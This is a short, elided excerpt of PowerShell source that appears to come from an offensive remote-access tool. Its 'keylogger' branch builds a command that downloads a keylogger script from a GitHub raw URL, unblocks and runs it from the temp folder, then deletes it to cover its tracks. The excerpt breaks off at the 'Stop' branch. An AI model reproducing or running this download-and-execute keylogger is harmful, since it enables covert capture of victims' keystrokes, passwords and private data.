...
"@;Write-Host $AnwsomeBanner
    ...
    If($Command -ieq "keylogger")
    {
        ...
        If($choise -ieq "Start")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/KeyManager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Start';Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
        }
        If($choise -ieq "Stop")
        {
